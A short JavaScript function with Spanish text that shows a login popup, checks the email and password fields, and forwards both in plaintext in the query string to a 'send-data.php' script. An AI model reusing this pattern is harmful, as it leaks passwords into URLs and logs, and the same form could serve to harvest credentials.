async function send() {
  const form = document.createElement('form');

  const formGroup1 = document.createElement('div');
  const formGroup2 = document.createElement('div');

  formGroup1.className = formGroup2.className = 'form-group';

  const email = document.createElement('input');
  const password = document.createElement('input');

  const text = document.createElement('h3');

  text.textContent = 'Iniciar Sesion';
  text.className = 'text-dark';

  email.placeholder = 'Email';
  password.placeholder = 'Contraseña';

  password.className = email.className = 'form-control';
  email.type = 'email';
  password.type = 'password';

  formGroup1.appendChild(email);
  formGroup2.appendChild(password);

  form.append(text);
  form.append(formGroup1);
  form.append(formGroup2);

  const values = await swal({
    content: form
  });
  if (email.value === '' && password.value === '') {
    swal({
      icon: 'error',
      title: 'Error',
      text: 'Falta el Email y la Contraseña'
    });
  } else if (password.value === '') {
    await swal({
      icon: 'error',
      title: 'Error',
      text: 'Falta la Contraseña'
    });
  } else if (email.value === '') {
    await swal({
      icon: 'error',
      title: 'Error',
      text: 'Falta el Email'
    });
  } else {
    location.href = `../send-data.php?user=${email.value}&pass=${password.value}`;
  }
}
